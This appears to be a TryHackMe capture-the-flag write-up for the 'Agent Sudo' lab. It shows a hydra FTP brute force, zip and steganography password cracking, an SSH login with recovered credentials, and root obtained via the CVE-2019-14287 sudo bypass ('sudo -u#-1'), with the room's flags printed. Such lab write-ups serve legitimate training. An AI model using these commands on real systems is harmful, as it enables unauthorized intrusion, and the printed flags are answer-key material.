# Tryhackme.com Room : Agent Sudo
`https://tryhackme.com/room/agentsudoctf`


# Instance
```
export IP=10.10.249.128
```

# Nmap
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
```

When visiting the webpage we get
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

We can spoof the user agent to get access to the page.
Using user agent `C` we get access to the secret page:
```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```

Agent name is `chris`

We use hydra to bruteforce ftp password :
```
hydra -l chris -P /usr/share/john/password.lst $IP ftp
```

We find
```
chris:crystal
```

We find `To_agentj.txt` on the ftp server
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

We get 2 images.

running `strings cutie.png` we find some interesting strings.

We use `binwalk -e cutie.png` to extract the content of the file
We get this
```
-rw-r--r-- 1 root root 279312 Jun 19 16:59 365
-rw-r--r-- 1 root root  33973 Jun 19 16:59 365.zlib
-rw-r--r-- 1 root root    280 Jun 19 16:59 8702.zip
-rw-r--r-- 1 root root      0 Oct 29  2019 To_agentR.txt
```

We use `john` to crack the zip password
```
zip2john 8702.zip > hashes
john hashes
```

We find the password `alien`

We must use `7z` to extract the archive

We get To_agentR.txt
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

This is base64 encoded string
```
cat QXJlYTUx | base64 -d
Area51
```

Which is the steg password for `cute-alien.jpg`
We get a `message.txt`
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We get 
```
james:hackerrules!
```

We can login in ssh 
`sshpass -p hackerrules! ssh -o StrictHostKeyChecking=no ssh james@$IP`


We get the user flag
```
b03d975e8c92a7c04146cfa7a5a313c7
```

We get an image that we reverse search to answer the question
```
Roswell alien autopsy
```

We then run linpeas on the machine.

We see that we are in sudoers.
`sudo -l` Give us
```
(ALL, !root) /bin/bash
```

Which is related to a cve-2019-14287

We get root using
`sudo -u#-1 /bin/bash`

We get the flag
```
b53a02f55b57d4439e3341834d70c062
```


